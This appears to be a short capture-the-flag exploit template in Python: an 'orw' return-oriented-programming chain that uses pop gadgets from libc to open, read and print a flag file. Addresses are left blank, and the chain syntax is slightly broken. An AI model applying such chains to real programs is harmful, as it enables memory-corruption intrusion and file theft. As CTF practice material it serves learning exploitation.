# orw
## open(flag_strings_addr,0)
## read(3, flag_addr , len)
## write(1, flag_addr , len)
## puts(flag_addr)
orw_addr = 
flag_addr = 
flag_strings_addr =
pop_rdi_ret =  libc_base + 
pop_rsi_ret = libc_base +  
pop_rdx_ret = libc_base + 
open_addr = libc_base +
read_addr = libc_base +
puts_addr = libc_base +
orw_chain = flat{
        pop_rdi_ret , flag_strings_addr , pop_rsi_ret , 0 , open_addr ,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_ret , 0x100 , read_addr , 
        pop_rdi_ret , flag_addr , puts_addr}
